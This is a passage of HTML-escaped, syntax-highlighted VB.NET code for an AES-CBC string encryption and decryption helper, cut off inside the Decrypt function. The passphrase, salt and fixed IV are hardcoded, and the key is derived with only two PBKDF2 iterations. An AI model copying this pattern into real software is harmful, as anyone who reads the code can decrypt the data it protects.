&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="k"&gt;Return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EncryptedString&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;N3st22&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;88552299&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;464R5DFA5DL6LE28&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;End&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;If&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;End&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Function&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;Public&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Shared&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Function&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;EncryptString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PlainString&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;If&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IsNullOrEmpty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PlainString&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Then&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="k"&gt;Return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Empty&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Else&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="k"&gt;Return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PlainString&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;N3st22&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;88552299&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;464R5DFA5DL6LE28&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;End&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;If&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;End&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Function&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;Public&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Shared&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Function&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;Encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;plainText&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                  &lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;passPhrase&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                  &lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;saltValue&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                    &lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;passwordIterations&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                  &lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;initVector&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                  &lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;keySize&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                          &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;initVectorBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;initVector&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;saltValueBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;saltValue&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plainText&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;New&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Rfc2898DeriveBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;passPhrase&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                          &lt;/span&gt;&lt;span class="n"&gt;saltValueBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                          &lt;/span&gt;&lt;span class="n"&gt;passwordIterations&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;keyBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;CInt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;keySize&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;symmetricKey&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;New&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;AesCryptoServiceProvider&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;symmetricKey&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Mode&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CipherMode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CBC&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;encryptor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ICryptoTransform&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;symmetricKey&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CreateEncryptor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;keyBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;initVectorBytes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Using&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;memoryStream&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;New&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;IO&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MemoryStream&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="k"&gt;Using&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cryptoStream&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;New&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CryptoStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;memoryStream&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                            &lt;/span&gt;&lt;span class="n"&gt;encryptor&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                            &lt;/span&gt;&lt;span class="n"&gt;CryptoStreamMode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Write&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                &lt;/span&gt;&lt;span class="n"&gt;cryptoStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                &lt;/span&gt;&lt;span class="n"&gt;cryptoStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FlushFinalBlock&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cipherTextBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;memoryStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ToArray&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                &lt;/span&gt;&lt;span class="n"&gt;memoryStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                &lt;/span&gt;&lt;span class="n"&gt;cryptoStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                &lt;/span&gt;&lt;span class="k"&gt;Return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Convert&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ToBase64String&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherTextBytes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="k"&gt;End&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Using&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;End&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Using&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;End&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Function&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;Public&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Shared&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Function&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;Decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                  &lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;passPhrase&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                  &lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;saltValue&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                    &lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;passwordIterations&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                  &lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;initVector&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                  &lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;keySize&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                          &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;initVectorBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
